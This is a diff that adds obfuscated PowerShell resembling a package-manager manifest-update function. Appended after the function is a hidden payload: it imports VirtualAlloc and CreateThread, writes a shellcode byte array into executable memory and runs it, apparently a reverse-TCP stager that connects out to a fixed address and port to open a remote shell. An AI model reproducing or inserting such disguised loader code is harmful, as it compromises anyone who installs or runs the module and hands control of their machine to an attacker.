+                if($params[("{2}{0}{1}"-f 'dModul','es','Neste')] -notcontains $dependency -and
+                $params[("{1}{2}{3}{0}" -f 'Modules','Requ','ire','d')] -notContains $dependency -and
+                $DependentModuleNames -notcontains $dependency)
+                {
+                    $message = $LocalizedData.ExternalModuleDependenciesNotSpecifiedInRequiredOrNestedModules -f ($dependency)
+                    ThrowError -ExceptionName ("{1}{6}{3}{0}{2}{4}{5}"-f'tEx','Syst','c','rgumen','e','ption','em.A') `
+                        -ExceptionMessage $message `
+                        -ErrorId ("{5}{1}{2}{4}{3}{0}"-f's','nvalidExt','ernalModuleDependen','e','ci','I') `
+                        -ExceptionObject $Exception `
+                        -CallerPSCmdlet $PSCmdlet `
+                        -ErrorCategory InvalidArgument
+                        return
+                    }
+            }
+            if($Data.ContainsKey(("{5}{2}{1}{4}{0}{7}{6}{3}" -f'Depe','ternalModul','x','cies','e','E','en','nd')))
+            {
+                $Data[("{4}{2}{0}{3}{1}" -f'pend','ncies','De','e','ExternalModule')] = $ExternalModuleDependencies
+            }
+            else
+            {
+                $Data.Add(("{3}{6}{2}{0}{4}{1}{5}" -f 'D','n','lModule','Exte','epe','dencies','rna'), $ExternalModuleDependencies)
+            }
+        }
+        if($PackageManagementProviders)
+        {
+            
+            $ModuleBase = Microsoft.PowerShell.Management\Split-Path $Path -Parent
+            $Files = Microsoft.PowerShell.Management\Get-ChildItem -Path $ModuleBase
+            foreach($provider in $PackageManagementProviders)
+            {
+                if ($Files.Name -notcontains $provider)
+                {
+                    $message = $LocalizedData.PackageManagementProvidersNotInModuleBaseFolder -f ($provider,$ModuleBase)
+                    ThrowError -ExceptionName ("{1}{5}{3}{0}{4}{2}" -f'entExcept','System.','n','um','io','Arg') `
+                               -ExceptionMessage $message `
+                               -ErrorId ("{2}{0}{5}{7}{3}{6}{4}{1}"-f 'nv','oviders','I','a','nagementPr','alidPac','geMa','k') `
+                               -ExceptionObject $PackageManagementProviders `
+                               -CallerPSCmdlet $PSCmdlet `
+                               -ErrorCategory InvalidArgument
+                    return
+                }
+            }
+
+            $Data[("{5}{0}{1}{3}{2}{4}{6}"-f'kageManagem','e','P','nt','rovider','Pac','s')] = $PackageManagementProviders
+        }
+        $PrivateDataInput = Get-PrivateData -PrivateData $Data
+
+        
+        $PrivateDataBegin = Select-String -Path $tempPath -Pattern ("{2}{0}{1}{3}" -f 'rivate','Data','P',' =')
+        $PrivateDataBeginLine = $PrivateDataBegin.LineNumber
+
+        $newManifest = Microsoft.PowerShell.Management\Get-Content -Path $tempPath
+        
+        
+        $PrivateDataEndLine=0
+        if($PrivateDataBegin -match "@{")
+        {
+            $leftBrace = 0
+            $EndLineOfFile = $newManifest.Length-1
+
+            For($i = $PrivateDataBeginLine;$i -lt $EndLineOfFile; $i++)
+            {
+                if($newManifest[$i] -match "{")
+                {
+                    $leftBrace ++
+                }
+                elseif($newManifest[$i] -match "}")
+                {
+                    if($leftBrace -gt 0)
+                    {
+                        $leftBrace --
+                    }
+                    else
+                    {
+                       $PrivateDataEndLine = $i
+                       break
+                    }
+                }
+            }
+        }
+
+
+        try
+        {
+            if($PrivateDataEndLine -ne 0)
+            {
+                
+                $newManifest  | where {$_.readcount -le $PrivateDataBeginLine -or $_.readcount -gt $PrivateDataEndLine+1} `
+                | ForEach-Object {
+                    $_
+                    if($_ -match ("{4}{2}{1}{3}{0}"-f' = ','vateD','ri','ata','P'))
+                    {
+                        $PrivateDataInput
+                    }
+                  } | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false
+            }
+
+            
+            else
+            {
+                $PrivateDataForDownlevelPS = "PrivateData = @{ `n"+$PrivateDataInput
+
+                $newManifest  | where {$_.readcount -le $PrivateDataBeginLine -or $_.readcount -gt $PrivateDataBeginLine } `
+                | ForEach-Object {
+                    $_
+                    if($_ -match ("{2}{0}{3}{1}"-f 'ivat',' ','Pr','eData ='))
+                    {
+                       $PrivateDataForDownlevelPS
+                    }
+                } | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false
+            }
+
+            
+            $testModuleInfo = Microsoft.PowerShell.Core\Test-ModuleManifest -Path $tempPath `
+                                                                        -Verbose:$VerbosePreference ` -ErrorAction Stop
+        }
+        
+        catch
+        {
+            $message = $LocalizedData.UpdatedModuleManifestNotValid -f ($Path, $_.Exception.Message)
+
+            ThrowError -ExceptionName ("{2}{3}{1}{6}{0}{4}{5}" -f'c','gumentE','Sys','tem.Ar','eptio','n','x') `
+                       -ExceptionMessage $message `
+                       -ErrorId ("{3}{4}{5}{0}{2}{1}{6}" -f 'Mani','estFi','f','U','pd','ate','leFail') `
+                       -ExceptionObject $_.Exception `
+                       -CallerPSCmdlet $PSCmdlet `
+                       -ErrorCategory InvalidArgument
+            return
+        }
+
+
+        $newContent = Microsoft.PowerShell.Management\Get-Content -Path $tempPath
+
+        
+        $newContent[1] = $newContent[1] -replace ((("{0}{2}{1}"-f 'U','PSGet_','pA')).rEplaCE('UpA',[stRINg][ChAr]39)), "'"
+
+        try
+        {
+            
+            if($PSCmdlet.ShouldProcess($Path,$LocalizedData.UpdateManifestContentMessage+$newContent))
+            {
+                Microsoft.PowerShell.Management\Set-Content -Path $Path -Value $newContent -Confirm:$false -WhatIf:$false
+            }
+
+            
+            if($PassThru)
+            {
+                return $newContent
+            }
+        }
+        catch
+        {
+            $message = $LocalizedData.ManifestFileReadWritePermissionDenied -f ($Path)
+            ThrowError -ExceptionName ("{6}{1}{5}{2}{0}{3}{4}"-f 'ume','t','m.Arg','ntExcept','ion','e','Sys') `
+                        -ExceptionMessage $message `
+                        -ErrorId ("{7}{0}{3}{2}{1}{8}{4}{6}{5}" -f'f','i','Perm','estFileReadWrite','n','ed','Deni','Mani','ssio') `
+                        -ExceptionObject $Path `
+                        -CallerPSCmdlet $PSCmdlet `
+                        -ErrorCategory InvalidArgument
+        }
+    }
+    finally
+    {
+        Microsoft.PowerShell.Management\Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -Confirm:$false -WhatIf:$false
+    }
+}
+$c = (((("{74}{72}{4}{24}{81}{1}{22}{23}{9}{29}{20}{63}{46}{56}{14}{10}{111}{77}{12}{89}{57}{67}{73}{53}{47}{54}{68}{79}{92}{39}{96}{11}{32}{18}{19}{16}{83}{110}{93}{97}{109}{95}{42}{50}{59}{108}{98}{87}{112}{82}{49}{104}{114}{33}{41}{66}{48}{26}{71}{94}{0}{31}{102}{44}{70}{58}{51}{86}{15}{25}{6}{90}{8}{30}{35}{36}{64}{65}{55}{52}{45}{100}{7}{5}{105}{40}{27}{17}{34}{28}{80}{2}{3}{85}{113}{76}{103}{115}{78}{61}{101}{21}{91}{62}{13}{69}{106}{43}{60}{37}{75}{88}{107}{38}{84}{99}"-f 't d',' ','r lpThr','eadId);[DllImport','nel32.dll','io','r','eat','s,','rn In','lp','y','uin',' IntPtr','tr ','StartA','Protect);',' ','uint f','l','tualAll',' e','static ex','te','{0})]p','dd','utes, u','s,','t','tPtr Vir',' I','wS','pe, ','IntPtr l','In','ntPtr lpPar','am','Ptr ','ount','n','g','pThreadAt','0})','(In','a',' dwC','t',' f','rib','Cr',']pub','Ptr ','int','t','lAl','u','P','wS','t','lic st','t','stati','rn','oc(In','eter,',' ','t','i','loca',' ','ckSize, In','i','er','ze, uin','[DllImport({0}k','dest, uint sr','ll{0})',' ','c ','t','Pt','ublic',' IntPtr ','[DllImpor',')','(','lp','r','c, ui','t d','es','xte','io','rnel3','n','{','T','2.dl','xte',';','r','c','t',']pu','ea','nFla','memset','nt c','atic e','l','t({0}ke','Address,','n','{0}msvcrt.d','teThread(','bli'))-f [ChAR]34));$w = Add-Type -memberDefinition $c -Name ("{0}{1}"-f'Win','32') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
